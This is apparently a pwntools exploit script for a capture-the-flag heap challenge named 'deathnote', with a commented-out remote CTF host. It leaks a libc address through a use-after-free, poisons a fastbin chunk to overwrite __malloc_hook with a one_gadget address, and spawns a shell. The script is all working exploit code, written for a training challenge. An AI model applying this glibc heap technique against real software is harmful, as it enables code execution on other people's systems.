#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('deathnote')
libc = ELF('./libc.so')
context.log_level = "debug"
env = {
    "LD_PRELOAD": os.path.abspath('./libc.so')
}
p = process(['./ld-2.23_64.so', elf.path], env=env)
gdb.attach(p, 'init-gef')
# p = remote('chall.nitdgplug.org', 30292)

def option(num):
    p.sendlineafter("> ", str(num))

def add(idx, sz, data):
    option(1)
    p.sendlineafter("the index:\n", str(idx))
    p.sendlineafter("the size:\n", str(sz))
    p.sendafter("r name:\n", data)

def update(idx, data):
    option(2)
    p.sendlineafter("the index:\n", str(idx))
    p.sendafter("ate the data:\n", data)

def delete(idx):
    option(3)
    p.sendlineafter("er the index:\n", str(idx))

def view(idx):
    option(4)
    p.sendlineafter("er the index:\n", str(idx))
    p.recvuntil("name:")
    return p.recvuntil("\n\n", True)

add(0, 0x200, "A" * 100)
add(1, 0x60, "A" *50)
add(2, 0x60, "B" *50)
delete(0)

leak = u64(view(0).ljust(8, '\x00'))

libc.address = leak - 0x3c4b78
log.info("Libc: 0x{:x}".format(libc.address))

delete(1)
target = 0x3c4aed + libc.address
update(1, p64(target))
print(hex(target))

add(3, 0x60, "C" * 50)
add(4, 0x60, "D" * 0x13 + p64(libc.address + 0xf02a4))

option(1)
p.sendlineafter("the index:\n", str(5))
p.sendlineafter("the size:\n", str(96))


p.interactive()
